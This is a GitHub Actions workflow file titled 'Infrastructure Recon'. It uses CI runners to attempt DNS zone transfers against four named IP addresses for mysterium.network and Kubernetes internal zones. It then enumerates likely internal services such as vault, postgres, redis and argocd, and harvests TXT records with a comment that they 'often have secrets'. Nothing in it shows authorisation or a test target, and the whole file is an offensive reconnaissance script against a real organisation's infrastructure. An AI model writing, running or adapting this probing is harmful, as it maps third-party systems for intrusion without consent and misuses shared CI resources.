name: Infrastructure Recon
on:
  workflow_dispatch:
  push:
    branches: [recon]

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: DNS Deep Recon
        shell: bash
        run: |
          set +e
          sudo apt-get install -y dnsutils > /dev/null 2>&1
          echo "=== DNS ZONE TRANSFER ATTEMPT ==="
          for ns in 135.181.91.132 37.27.26.254 188.245.149.150 116.203.130.98; do
            echo "--- AXFR mysterium.network @$ns ---"
            dig @$ns mysterium.network AXFR +short 2>&1 | head -30
            echo "--- AXFR internal zones ---"
            dig @$ns cluster.local AXFR +short 2>&1 | head -20
            dig @$ns svc.cluster.local AXFR +short 2>&1 | head -20
          done
          echo "=== DNS SERVICE DISCOVERY ==="
          for ns in 135.181.91.132 37.27.26.254; do
            echo "--- @$ns ---"
            dig @$ns n8n.mysterium.network A +short
            dig @$ns grafana.mysterium.network A +short
            dig @$ns vault.mysterium.network A +short
            dig @$ns consul.mysterium.network A +short
            dig @$ns redis.mysterium.network A +short
            dig @$ns postgres.mysterium.network A +short
            dig @$ns db.mysterium.network A +short
            dig @$ns mongo.mysterium.network A +short
            dig @$ns rabbitmq.mysterium.network A +short
            dig @$ns k8s.mysterium.network A +short
            dig @$ns api.mysterium.network A +short
            dig @$ns internal.mysterium.network A +short
            echo "--- SRV records ---"
            dig @$ns _http._tcp.mysterium.network SRV +short
            dig @$ns _https._tcp.mysterium.network SRV +short
            echo "--- ANY records ---"
            dig @$ns mysterium.network ANY +short 2>&1 | head -20
            echo "--- Reverse DNS ---"
            dig @$ns -x 135.181.91.132 +short
            dig @$ns -x 37.27.26.254 +short
            dig @$ns -x 188.245.149.150 +short
            dig @$ns -x 116.203.130.98 +short
            echo "--- K8s internal DNS ---"
            dig @$ns kubernetes.default.svc.cluster.local A +short
            dig @$ns n8n.default.svc.cluster.local A +short
            dig @$ns grafana.default.svc.cluster.local A +short
            dig @$ns sentry.default.svc.cluster.local A +short
            dig @$ns vault.default.svc.cluster.local A +short
            dig @$ns argocd-server.argocd.svc.cluster.local A +short
            echo "--- TXT records (often have secrets) ---"
            dig @$ns mysterium.network TXT +short
            dig @$ns _acme-challenge.mysterium.network TXT +short
          done
          echo "=== DONE ==="
